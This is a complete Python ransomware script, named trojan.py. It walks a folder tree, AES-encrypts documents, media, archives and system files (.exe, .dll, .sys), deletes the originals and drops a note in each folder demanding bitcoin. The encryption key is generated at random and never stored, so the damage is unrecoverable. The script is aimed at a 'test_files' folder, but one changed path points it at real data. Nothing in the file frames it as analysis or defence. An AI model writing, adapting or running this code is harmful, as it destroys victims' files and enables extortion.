# trojan.py
import os
import glob
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ─── CONFIGURATION ──────────────────────────────────────────────────────────────
TARGET_EXTS = ['.txt', '.docx', '.jpg', '.xlsx','.zip', '.pdf', '.pptx', '.doc', '.png', '.mp4', '.avi', '.mkv','.docx', '.ppt', '.xls', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso', '.exe', '.dll', '.sys', '.bin']
RANSOM_NOTE = """Your files have been encrypted!
To recover them, send 1 BTC to wallet XYZ and email us at attacker@bad.com
"""
KEY = os.urandom(32)  # AES-256 key
IV  = os.urandom(16)  # AES block size (128-bit)

# ─── IMPLEMENTATION ──────────────────────────────────────────────────────────────
def drop_ransom_note(folder):
    note = os.path.join(folder, 'README_RECOVER.txt')
    if not os.path.exists(note):
        with open(note, 'w') as f:
            f.write(RANSOM_NOTE)

def encrypt_file(path):
    with open(path, 'rb') as f:
        data = f.read()
    pad = (16 - len(data) % 16)
    data += bytes([pad]) * pad

    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    ct = cipher.encryptor().update(data) + cipher.encryptor().finalize()

    out = path + '.locked'
    with open(out, 'wb') as f:
        f.write(IV + ct)
    os.remove(path)
    print(f'[+] Encrypted {path}')

def walk_and_encrypt(root):
    for dirpath, _, _ in os.walk(root):
        drop_ransom_note(dirpath)
        for ext in TARGET_EXTS:
            for fn in glob.glob(os.path.join(dirpath, f'*{ext}')):
                try:
                    encrypt_file(fn)
                except Exception as e:
                    print(f'[-] Error on {fn}: {e}')

# ─── ENTRY POINT ────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    base = r".\test_files"
    print(f'[*] Encrypting files under {base}')
    walk_and_encrypt(base)
    print('[*] Done. Files locked!')
